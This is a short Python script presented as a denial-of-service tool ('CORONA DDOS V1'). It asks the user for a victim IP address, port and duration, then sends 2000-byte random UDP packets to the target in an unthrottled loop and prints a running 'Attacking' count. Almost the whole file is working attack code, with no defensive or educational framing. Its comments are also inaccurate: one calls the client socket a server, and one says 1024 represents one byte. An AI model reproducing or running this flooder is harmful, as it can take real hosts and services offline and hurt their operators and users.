import time
import socket
import random
import sys

def flood(victim, vport, duration):
    
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # 1024 representes one byte to the server
    bytes = random._urandom(2000)
    
    timeout =  time.time() + int(duration)
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, int(vport)))
        sent = sent + 1
        print(f'Attacking - {sent} sent packages {victim} at the port {vport}.')

def banner():
    print('---CORONA DDOS V1')
    print('  ---BY ASRORAA\n')

def menu():
    v = input('victim ip adress :')
    p = input('port :')
    d = input('duration :')
    flood(v,p,d)
banner()
menu()



